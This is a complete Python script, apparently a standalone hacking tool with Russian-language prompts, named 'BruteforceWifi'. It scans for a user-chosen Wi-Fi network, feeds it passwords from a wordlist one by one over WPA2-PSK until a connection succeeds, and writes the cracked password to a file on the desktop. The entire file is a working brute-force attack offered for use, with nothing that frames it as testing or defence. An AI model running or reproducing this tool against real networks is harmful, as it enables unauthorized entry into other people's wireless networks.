from pywifi import PyWiFi, const, Profile

from pystyle import *
from pyfiglet import Figlet

import time

import os

from pathlib import Path


Success = Colors.green + "[+]" + Colors.reset
Error = Colors.red + "[-]" + Colors.reset


def initialize_wifi():
    try:
        wifi = PyWiFi()
        if not wifi.interfaces():
            print(f"\n{Error} WiFi интерфейс не найден!")
            return None
        return wifi.interfaces()[0]
    except Exception as e:
        print(f"\n{Error} Ошибка инициализации WiFi: {e}")
        return None


def scan_target_network(iface, ssid):
    try:
        iface.scan()
        time.sleep(2)
        for network in iface.scan_results():
            if network.ssid == ssid:
                return network
        return None
    except Exception as e:
        print(f"{Error} Ошибка сканирования сетей: {e}")
        return None


def load_wordlist(wordlist_path):
    default_path = "Wordlist/passwords.txt"
    path = wordlist_path if wordlist_path else default_path
    
    if not os.path.exists(path):
        print(f"{Error} Файл {path} не найден!")
        return None
    
    try:
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = []
            for line in f:
                cleaned_line = line.strip()
                if cleaned_line:
                    passwords.append(cleaned_line)
            return passwords
    except Exception as e:
        print(f"{Error} Ошибка чтения файла: {e}")
        return None


def attempt_connection(iface, ssid, password):
    try:
        profile = Profile()
        profile.ssid = ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = password

        iface.remove_all_network_profiles()
        tmp_profile = iface.add_network_profile(profile)
        iface.connect(tmp_profile)
        time.sleep(5)
        return iface.status() == const.IFACE_CONNECTED
    except Exception:
        return False


def run_bruteforce(iface, ssid, wordlist):
    for count, password in enumerate(wordlist, 1):
        print(f"Попытка №{count}: {password}", end="\r")
        if attempt_connection(iface, ssid, password):
            print(f"\n\n{Success} Успех! Пароль: {password}")
            return password
        time.sleep(1)
    return None


def save_results(ssid, password):
    home = Path.home()
    desktop = home / "Desktop"
    
    if not desktop.exists():
        desktop = home / "Рабочий стол"
    
    if not desktop.exists():
        desktop = home
    
    filename = desktop / "BruteforceWifi.txt"
    
    try:
        with open(filename, "w", encoding="utf-8") as f:
            f.write(f"Результаты брутфорса {ssid}\n\n")
            f.write(f"SSID: {ssid}\n")
            f.write(f"Пароль: {password}\n")
        print(f"\nФайл сохранен: {filename}")
    except Exception as e:
        print(f"\nОшибка сохранения: {e}")


def chek_root():
    if os.name == 'posix' and os.geteuid() != 0:
        print(f"\n{Error} Требуются права root! Запустите через sudo")
        print("")
        exit(1)


def display_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    Print = Figlet(font='slant').renderText('BruteforceWifi')
    Write.Print(Center.XCenter(Print), Colors.blue_to_cyan, interval=0.001)
    chek_root()


def get_user_input():
    display_banner()
    ssid = input("\n[!] Введите имя сети (SSID): ").strip()
    wordlist = input("[!] Введите путь к файлу (по умолчанию 'Wordlist/passwords.txt'): ").strip()
    return ssid, wordlist


def main():
    ssid, wordlist_path = get_user_input()
    
    iface = initialize_wifi()
    if not iface:
        input("\n[!] Нажмите Enter для выхода...")
        quit()

    if not scan_target_network(iface, ssid):
        print(f"{Error} Сеть {ssid} не найдена!")
        input("\n[!] Нажмите Enter для выхода...")
        return

    passwords = load_wordlist(wordlist_path)
    if not passwords:
        input("\n[!] Нажмите Enter для выхода...")
        return

    print(f"\nНачало подбора пароля для {ssid}...")
    password = run_bruteforce(iface, ssid, passwords)
    
    if password:
        save_results(ssid, password)
        print(f"\n{Success} Данные сохранены на рабочий стол!")
    else:
        print(f"\n{Error} Не удалось подобрать пароль.")
    
    input("\n[!] Нажмите Enter для выхода...")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nДо свидания!")